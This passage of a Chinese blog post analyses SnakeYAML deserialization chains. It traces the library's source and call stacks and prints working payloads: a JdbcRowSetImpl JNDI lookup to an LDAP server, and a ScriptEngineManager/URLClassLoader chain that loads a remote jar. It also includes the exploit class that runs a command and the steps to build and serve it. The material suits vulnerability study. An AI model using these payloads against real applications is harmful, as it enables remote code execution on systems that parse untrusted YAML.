<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">!!com.sun.rowset.JdbcRowSetImpl &#123;dataSourceName: ldap:<span class="comment">//127.0.0.1:1389/5cjybz, autoCommit: true&#125;</span></span><br></pre></td></tr></table></figure>

<p>测试类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> SnakeYaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PocTest1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;!!com.sun.rowset.JdbcRowSetImpl &#123;dataSourceName: ldap://127.0.0.1:1389/5cjybz, autoCommit: true&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数调用栈：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">getObjectFactoryFromReference:<span class="number">163</span>, NamingManager (javax.naming.spi)</span><br><span class="line">getObjectInstance:<span class="number">189</span>, DirectoryManager (javax.naming.spi)</span><br><span class="line">c_lookup:<span class="number">1085</span>, LdapCtx (com.sun.jndi.ldap)</span><br><span class="line">p_lookup:<span class="number">542</span>, ComponentContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:<span class="number">177</span>, PartialCompositeContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:<span class="number">205</span>, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:<span class="number">94</span>, ldapURLContext (com.sun.jndi.url.ldap)</span><br><span class="line">lookup:<span class="number">417</span>, InitialContext (javax.naming)</span><br><span class="line">connect:<span class="number">624</span>, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">setAutoCommit:<span class="number">4067</span>, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">set:<span class="number">77</span>, MethodProperty (org.yaml.snakeyaml.introspector)</span><br><span class="line">constructJavaBean2ndStep:<span class="number">285</span>, Constructor$ConstructMapping (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:<span class="number">171</span>, Constructor$ConstructMapping (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:<span class="number">331</span>, Constructor$ConstructYamlObject (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObjectNoCheck:<span class="number">229</span>, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObject:<span class="number">219</span>, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructDocument:<span class="number">173</span>, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">getSingleData:<span class="number">157</span>, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">loadFromReader:<span class="number">490</span>, Yaml (org.yaml.snakeyaml)</span><br><span class="line">load:<span class="number">416</span>, Yaml (org.yaml.snakeyaml)</span><br><span class="line">main:<span class="number">9</span>, PocTest1 (SnakeYaml)</span><br></pre></td></tr></table></figure>

<p>一步一步走流程，先来到Yaml类中的load方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; T <span class="title function_">load</span><span class="params">(String yaml)</span> &#123;</span><br><span class="line">    <span class="comment">// 实例化一个StreamReader对象</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.loadFromReader(<span class="keyword">new</span> <span class="title class_">StreamReader</span>(yaml), Object.class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续来到Yaml类中的loadFromReader方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Object <span class="title function_">loadFromReader</span><span class="params">(StreamReader sreader, Class&lt;?&gt; type)</span> &#123;</span><br><span class="line">    <span class="type">Composer</span> <span class="variable">composer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Composer</span>(<span class="keyword">new</span> <span class="title class_">ParserImpl</span>(sreader), <span class="built_in">this</span>.resolver, <span class="built_in">this</span>.loadingConfig);</span><br><span class="line">    <span class="built_in">this</span>.constructor.setComposer(composer);</span><br><span class="line">    <span class="comment">// 进入这里</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.constructor.getSingleData(type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入BaseConstructor的getSingleData方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getSingleData</span><span class="params">(Class&lt;?&gt; type)</span> &#123;</span><br><span class="line">    <span class="comment">// 获取单个Node对象，用于表示Yaml文档中的一个节点</span></span><br><span class="line">    <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> <span class="built_in">this</span>.composer.getSingleNode();</span><br><span class="line">    <span class="comment">// 检查获取的节点是否存在且不是空标签</span></span><br><span class="line">    <span class="keyword">if</span> (node != <span class="literal">null</span> &amp;&amp; !Tag.NULL.equals(node.getTag())) &#123;</span><br><span class="line">        <span class="keyword">if</span> (Object.class != type) &#123;</span><br><span class="line">            node.setTag(<span class="keyword">new</span> <span class="title class_">Tag</span>(type));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.rootTag != <span class="literal">null</span>) &#123;</span><br><span class="line">            node.setTag(<span class="built_in">this</span>.rootTag);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 将节点转换成Java对象并且返回</span></span><br><span class="line">        <span class="comment">// 进入这里</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.constructDocument(node);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 获取与空标签关联的Construct实例, 并且将其实例化返回</span></span><br><span class="line">        <span class="type">Construct</span> <span class="variable">construct</span> <span class="operator">=</span> (Construct)<span class="built_in">this</span>.yamlConstructors.get(Tag.NULL);</span><br><span class="line">        <span class="keyword">return</span> construct.construct(node);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续进入constructDocument函数看看如何转换成Java对象的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Object <span class="title function_">constructDocument</span><span class="params">(Node node)</span> &#123;</span><br><span class="line">    Object var3;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 将yaml节点转换成Java对象</span></span><br><span class="line">        <span class="comment">// 进入这里</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">data</span> <span class="operator">=</span> <span class="built_in">this</span>.constructObject(node);</span><br><span class="line">        <span class="comment">// 递归，通常在yaml文档包含嵌套结构时使用</span></span><br><span class="line">        <span class="built_in">this</span>.fillRecursive();</span><br><span class="line">        var3 = data;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException var7) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.wrappedToRootException &amp;&amp; !(var7 <span class="keyword">instanceof</span> YAMLException)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">YAMLException</span>(var7);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">throw</span> var7;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.constructedObjects.clear();</span><br><span class="line">        <span class="built_in">this</span>.recursiveObjects.clear();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> var3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续查看constructObject函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">constructObject</span><span class="params">(Node node)</span> &#123;</span><br><span class="line">    <span class="comment">// 判断当前属性中是否存在与当前节点对应的Java对象，如果存在则返回该对象，如果不存在则调用constructObjectNoCheck方法创建</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.constructedObjects.containsKey(node) ? <span class="built_in">this</span>.constructedObjects.get(node) : <span class="built_in">this</span>.constructObjectNoCheck(node);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的this.constructedObjects属性中并没有对应的节点，所以只能调用constructObjectNoCheck函数创建</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">constructObjectNoCheck</span><span class="params">(Node node)</span> &#123;</span><br><span class="line">    <span class="comment">// 表示当前节点是一个无法构造的递归节点,即不能与其他节点相互引用</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.recursiveObjects.contains(node)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConstructorException</span>((String)<span class="literal">null</span>, (Mark)<span class="literal">null</span>, <span class="string">&quot;found unconstructable recursive node&quot;</span>, node.getStartMark());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 将当前节点添加到recursiveObjects属性中，以便后续检查是否存在递归引用</span></span><br><span class="line">        <span class="built_in">this</span>.recursiveObjects.add(node);</span><br><span class="line">        <span class="comment">// 使用getConstructor方法获取当前节点的构造器</span></span><br><span class="line">        <span class="type">Construct</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="built_in">this</span>.getConstructor(node);</span><br><span class="line">        <span class="comment">// 如果constructedObjects属性中存在与当前节点对应的Java对象，则返回该对象。如果不存在，则调用constructor.construct方法构造Java对象</span></span><br><span class="line">        <span class="comment">// 进入这里</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">data</span> <span class="operator">=</span> <span class="built_in">this</span>.constructedObjects.containsKey(node) ? <span class="built_in">this</span>.constructedObjects.get(node) : constructor.construct(node);</span><br><span class="line">        <span class="comment">// 在构造对象之后，调用finalizeConstruction方法对其进行后续处理，例如检查是否存在未解析的属性、设置默认值等</span></span><br><span class="line">        <span class="built_in">this</span>.finalizeConstruction(node, data);</span><br><span class="line">        <span class="comment">// 将当前节点和对应的Java对象存储在constructedObjects属性中，以便在后续处理中使用</span></span><br><span class="line">        <span class="built_in">this</span>.constructedObjects.put(node, data);</span><br><span class="line">        <span class="comment">// 将当前节点从recursiveObjects属性中移除，以便在后续处理中不再检查是否存在递归引用</span></span><br><span class="line">        <span class="built_in">this</span>.recursiveObjects.remove(node);</span><br><span class="line">        <span class="comment">//如果当前节点需要两步构造，则调用constructor.construct2ndStep方法完成第二步构造</span></span><br><span class="line">        <span class="keyword">if</span> (node.isTwoStepsConstruction()) &#123;</span><br><span class="line">            constructor.construct2ndStep(node, data);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的constructor是ConstructYamlObject对象，查看其construct方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">construct</span><span class="params">(Node node)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 使用getConstructor方法获取当前节点的构造器</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.getConstructor(node).construct(node);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ConstructorException var3) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var3;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var4) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConstructorException</span>((String)<span class="literal">null</span>, (Mark)<span class="literal">null</span>, <span class="string">&quot;Can&#x27;t construct a java object for &quot;</span> + node.getTag() + <span class="string">&quot;; exception=&quot;</span> + var4.getMessage(), node.getStartMark(), var4);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>获取到的构造器是ConstructMapping对象，进入其construct函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">construct</span><span class="params">(Node node)</span> &#123;</span><br><span class="line">    <span class="comment">// 将node转换为MappingNode类型</span></span><br><span class="line">    <span class="type">MappingNode</span> <span class="variable">mnode</span> <span class="operator">=</span> (MappingNode)node;</span><br><span class="line">    <span class="comment">// 如果当前节点的类型是Map或其子类，则调用newMap或constructMapping方法构造Java对象</span></span><br><span class="line">    <span class="keyword">if</span> (Map.class.isAssignableFrom(node.getType())) &#123;</span><br><span class="line">        <span class="keyword">return</span> node.isTwoStepsConstruction() ? Constructor.<span class="built_in">this</span>.newMap(mnode) : Constructor.<span class="built_in">this</span>.constructMapping(mnode);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Collection.class.isAssignableFrom(node.getType())) &#123;</span><br><span class="line">        <span class="comment">// 如果当前节点的类型是Collection或其子类，则调用newSet或constructSet方法构造Java对象，并返回该对象</span></span><br><span class="line">        <span class="keyword">return</span> node.isTwoStepsConstruction() ? Constructor.<span class="built_in">this</span>.newSet(mnode) : Constructor.<span class="built_in">this</span>.constructSet(mnode);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 如果当前节点的类型不是Map或Collection的子类，则调用newInstance方法创建一个新的Java对象，并返回该对象</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> Constructor.<span class="built_in">this</span>.newInstance(mnode);</span><br><span class="line">        <span class="comment">// 如果当前节点需要两步构造，则调用constructJavaBean2ndStep方法完成第二步构造。如果不需要两步构造，则直接返回构造的Java对象</span></span><br><span class="line">        <span class="keyword">return</span> node.isTwoStepsConstruction() ? obj : <span class="built_in">this</span>.constructJavaBean2ndStep(mnode, obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230721171129.png"><br>在constructJavaBean2ndStep函数中，会获取yaml格式数据中的属性键值对，调用property.set()来设置上面实例化对象的属性<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230721171605.png"><br>在MethodProperty类的set方法中，获取了响应属性的方法进行invoke</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">set</span><span class="params">(Object object, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">this</span>.writable) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">YAMLException</span>(<span class="string">&quot;No writable property &#x27;&quot;</span> + <span class="built_in">this</span>.getName() + <span class="string">&quot;&#x27; on class: &quot;</span> + object.getClass().getName());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 这里</span></span><br><span class="line">        <span class="built_in">this</span>.property.getWriteMethod().invoke(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230721171951.png"><br>即会调用JdbcRowSetImpl的setAutoCommit方法，这样就成功触发了JdbcRowSetImpl链和JNDI注入了</p>
<h2 id="ScriptEngineManager链"><a href="#ScriptEngineManager链" class="headerlink" title="ScriptEngineManager链"></a>ScriptEngineManager链</h2><p><strong>什么是SPI机制</strong><br>SPI(Service Provider Interface), JDK内置的一种服务提供发现机制。它的利用方式是通过在ClassPath路径下的<code>META-INF/services</code>文件夹下查找文件，自动加载文件中所定义的类<br>例如以mysql-connector包为例：<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230723164005.png"><br>而Dirver类中的内容是：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mysql.cj.jdbc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Driver</span> <span class="keyword">extends</span> <span class="title class_">NonRegisteringDriver</span> <span class="keyword">implements</span> <span class="title class_">java</span>.sql.Driver &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Driver</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            DriverManager.registerDriver(<span class="keyword">new</span> <span class="title class_">Driver</span>());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException var1) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;Can&#x27;t register driver!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个Driver类实现了java.sql.Driver接口，这段代码主要是将当前类的实例注册为MySQL数据库的驱动程序，实现了一个MySQL数据库的Java驱动程序，这个方法会在JVM启动时执行，从而确保了该驱动程序在应用程序启动时已经被注册。当应用程序需要连接MySQL数据库时，可以通过DriverManager类的getConnection()方法获取com.mysql.cj.jdbc.Driver类的实例，进而建立MySQL数据库连接<br><strong>环境</strong>：SnakeYaml1.27   JDK1.8_66<br><strong>复现与分析</strong>：<br>POC：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> SnakeYaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PocTest2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\&quot;http://tlk0u6qn.eyes.sh\&quot;]]]]\n&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>dnslog平台出现请求记录，用于验证是否存在该漏洞且ScriptEngineManager链是否可用</p>
<p><strong>命令执行</strong>：<br>现成的利用项目：<a href="https://github.com/artsploit/yaml-payload.git">https://github.com/artsploit/yaml-payload.git</a><br>更改里面的命令执行代码，使用以下命令进行编译即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">javac src/artsploit/AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf yaml-payload.jar -C src/ .</span><br></pre></td></tr></table></figure>

<p>注意：一定要使用一致的java版本进行编译<br>其中在META&#x2F;services文件夹的文件中，里面的内容即是我们的恶意类<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230723165301.png"><br>在AwesomeScriptEngineFactory类中，它实现了ScriptEngineFactory接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> artsploit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngine;</span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngineFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AwesomeScriptEngineFactory</span> <span class="keyword">implements</span> <span class="title class_">ScriptEngineFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">AwesomeScriptEngineFactory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// Runtime.getRuntime().exec(&quot;dig scriptengine.x.artsploit.com&quot;);</span></span><br><span class="line">            <span class="comment">// Runtime.getRuntime().exec(&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;);</span></span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getEngineName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getEngineVersion</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">getExtensions</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">getMimeTypes</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">getNames</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getLanguageName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getLanguageVersion</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getParameter</span><span class="params">(String key)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMethodCallSyntax</span><span class="params">(String obj, String m, String... args)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getOutputStatement</span><span class="params">(String toDisplay)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getProgram</span><span class="params">(String... statements)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ScriptEngine <span class="title function_">getScriptEngine</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据上面mysql的例子可以猜测到，在ScriptEngineFactory类中应该有对我们构造的恶意类实例化的过程，在实例化时会自动调用构造函数从而导致命令执行<br>在生成的jar文件目录下开启web服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m http.server 8080</span><br></pre></td></tr></table></figure>

<p>POC：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">!!javax.script.ScriptEngineManager [</span><br><span class="line">  !!java.net.URLClassLoader [[</span><br><span class="line">    !!java.net.URL [<span class="string">&quot;http://127.0.0.1:8080/yaml-payload.jar&quot;</span>]</span><br><span class="line">  ]]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>测试类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> SnakeYaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PocTest2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\&quot;http://127.0.0.1:8080/yaml-payload.jar\&quot;]]]]\n&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数调用栈：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">nextService:<span class="number">381</span>, ServiceLoader$LazyIterator (java.util)</span><br><span class="line">next:<span class="number">404</span>, ServiceLoader$LazyIterator (java.util)</span><br><span class="line">next:<span class="number">480</span>, ServiceLoader$<span class="number">1</span> (java.util)</span><br><span class="line">initEngines:<span class="number">122</span>, ScriptEngineManager (javax.script)</span><br><span class="line">init:<span class="number">84</span>, ScriptEngineManager (javax.script)</span><br><span class="line">&lt;init&gt;:<span class="number">75</span>, ScriptEngineManager (javax.script)</span><br><span class="line">newInstance0:-<span class="number">1</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">62</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">45</span>, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">422</span>, Constructor (java.lang.reflect)</span><br><span class="line">construct:<span class="number">570</span>, Constructor$ConstructSequence (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:<span class="number">331</span>, Constructor$ConstructYamlObject (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObjectNoCheck:<span class="number">229</span>, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObject:<span class="number">219</span>, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructDocument:<span class="number">173</span>, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">getSingleData:<span class="number">157</span>, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">loadFromReader:<span class="number">490</span>, Yaml (org.yaml.snakeyaml)</span><br><span class="line">load:<span class="number">416</span>, Yaml (org.yaml.snakeyaml)</span><br><span class="line">main:<span class="number">10</span>, PocTest2 (SnakeYaml)</span><br></pre></td></tr></table></figure>

<p>前面的大致步骤还是和JdbcRowSetImpl链的过程一致，这里的关键在于Constructor不一致，这里是ConstructSequence，在对ScriptEngineManager实例化的过程中就会触发命令执行<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230722213348.png"><br>接下来就来看一下ScriptEngineManager链的利用过程<br>首先来到其构造函数，传入的loader是URLClassLoader</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ScriptEngineManager</span><span class="params">(ClassLoader loader)</span> &#123;</span><br><span class="line">    init(loader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入init函数，都是一些属性的初始化，最后调用initEngines函数，传入loader<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230722214710.png"><br>直到这一步，itr是ServiceLoader对象，会调用其next方法</p>
